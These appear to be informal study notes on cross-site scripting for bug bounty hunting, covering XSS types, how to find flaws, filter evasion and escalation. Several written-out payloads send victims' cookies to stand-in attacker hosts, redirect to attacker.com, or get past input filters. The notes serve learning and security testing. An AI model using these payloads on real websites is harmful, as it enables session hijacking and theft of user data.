Cross-site scripting. It is the most popular vulnerability to be found online and also to be reported on bug bounty sites like hackerone. 4 million dollars were used to pay for xss findings on only hackerone.

If the page can't differ user data from actual code that is used to create website, attacker can inject his own script into the website. User browser when rendering such page can then send someone's cookies, reveal user data, redirect user to malicious website etc. Sometimes those scripts can be in Flash, VBScript and everything that is rendered by site.

In most cases it is find by inputing something like polyglot or well-prepared payload into user input like email address input. Then the input has to be shown somewhere in order for the vulnerability to work. For example let's take newsletter input box where you should input mail if u want to sign up for newsletter. Then there is alert that the {email} subscribed to newsletter. By closing html brackets and later on inserting <script> brackets </script> we cam easily escape alert html and then inject malicious script.

Sometimes xss can be hidden in url. For example
**https://subscribe.example.com?email=EMAIL_OF_SUBSCRIPTIN ->**
https://subscribe.example.com?email=<script>location="http://attacker.com";</script>

Script that can be used for transfering cookies data:
<script>image = new Image();
image.src='http://ip_server/?c='+document.cookie;</script>

We have 3 main types of high tier vulnerability XSS: Stored, Reflected, DOM based
And there are also XSS like: blind, self,

### **Stored**
He takes place when server stores data somewhere and later on it uses it to render site It is most sensitive case, cause other users could potentially be affected by it just by browsing for example someones page.

#### **Blind**
it is  XSS that is actually stored BUT the results are shown somewhere else, or hidden from the user. For example filling contact admin info with xss, could potentially make xss on administrator, rendering malicious code in their browser. We can't really see if the xss worked, because our data isn't shown to us but rather someone else.

### **Reflected**
Its type of XSS where user input is processed and not stored. For example search bars. When we type something and hit enter we're hit with the: "You searched for {x}" and this {x} data is entirely processed by frontend and backed but its not stored anywhere. It is less critical then stored xss, because user has to somehow intereact with the hacker not only browse webpage. For Example he has to click on malicious link that can look something like this:
https://example.com/search?q=<script>alert('tiger');</script>
query could be potentially malicious and webapp could potentially load it so that script actually works like xss. It is still needed for victim to actually click link, so in some bug bounty programs people would shit on finding like that.

### **DOM-Based**
DOM is Document Object Model and it is used by browsers to render websites. It defines basic attributes, structure and behaviour of website. It helps scripts reach the content of webpage and editing it. 

Site is vulnerable when it downloads user data and by the information provided it dynamically changes DOM object. JQuery is very vulnerable to DOM XSS.

Data is by its entirety processed on the frontend, so there is no actual information provided to backend, thats the difference between reflect XSS and DOM-based XSS.

Example:
https://example.com?locale=north+america ->
https://example.com?locale=<script>location='htttps:/malicious.website/?c='+document.cookie;</script>

Sometimes it can also be inside fragments of url page like:
http://example.com#about_us ->
http://example.com#<script>location='htttps:/malicious.website/?c='+document.cookie;</script>

### **Self**
It's highly unlikely to be paid in bug bounty programs cause user interaction is highly unlikely. User has to input xss by himself to some field to cause self harm. It requires social engineering practices like:
"Paste this code into your nickname for something funny to happen".

It's not stored anywhere or data isn't shown anywhere and user has to make curl by himself so its highly unikely.

## To Protect the world from devastation...
To not be victim of xss websites should use input sanitization and output escaping. Server should atleast try and verify the integrity of the input. It should angle to get rid of atleast basics of xss like blacklisting <script> </script>

### **To hunt XSS**
It can be found in places where user data is reflected back to us. Sometimes in wild it can be found in for example mails, smtp protocols, DNS, etc.

1. Try to look for ability to input data. Sometimes they can be provided by dropdown menus and/or date and time inputs. To find reflected and DOM-based XSS you have to look on the rigidly implemented queries in urls. Don't input payloads just yet. Try to inout something specific like: XSS_TurtleBB in order to later find it on the webpage. 
2. Now try payload. Basic one like <script> alert('hello') </script>
3. It doesn't probably work cause most user input nowadays is sanitized. Nothing wrong with that, we have to get fancy.
   <img onload=alert('hello') src="example.com")>
   Or using special urls like:
   javascript:alert('XSS by Vickie')
   data:text/html;base64.PHNJcm1wdD5hbGv...
   Above base64 decoded is something like <script>alert('hello')</script>
   
   Sometimes we have to close brackets of HTML. For example when there is input loaded upon image:
   url.com?input=picturemm.png so it becomes
   <img src="picturemm.png">
   
   url.com?input="/><script>location="http://attacker.com";</script> ->
   So it becomes <img src=""/><script>location="http://attacker.com";</script>
   When your script doesn't work sometimes it just fucked up syntax.
   
   Instead of escaping syntax we can embrace it for example:
   url.com?input=123" onerror="location="http://attacker.com""->
   So it becomes <img src="123" onerror="location="http://attacker.com;"">
   
   Sometimes websites also use things called filters. They can be used to sanitize special characters. We can try to use char values instead of character and use fromCharCode(104, 116, 112,  58, 47.....) or ascii(10, 25, 25.....) etc.
   
   Somtimes filters are done poorly any you can try and do stuff like: <scri<script>pt> </scri</script>pt> </script> and try to avoid them
   

	There are much more payloads to be discovered. We also have something called
	**XSS Polyglots** which are essentially payloads that should work in most scenarios. Not to be absolutely trusted by any means, but they're more likely to find vulnerability then not. 

	In some cases it is advised to try inputting special characters to see which are sanitized and which are rendered.
4. And then we should try to confirm if the payload can work.


### **Escalation**
Escalation depends mostly on XSS target/victim. It depends on which type of XSS it is and what users are endangered.  Sometimes you can hijack session of admin, because of blind-xss with putting it into reports for admin and sometimes you can just steal some data from one user who clicks link. Sometimes it can be used to render some amount of malicious website instead of normal one so that user fills data on something that we as a threat actor rendered ourselves. Automatic Redirects are also possible.

### **Automation** 
It is mainly odne by using fuzzers or burp suite intruder. 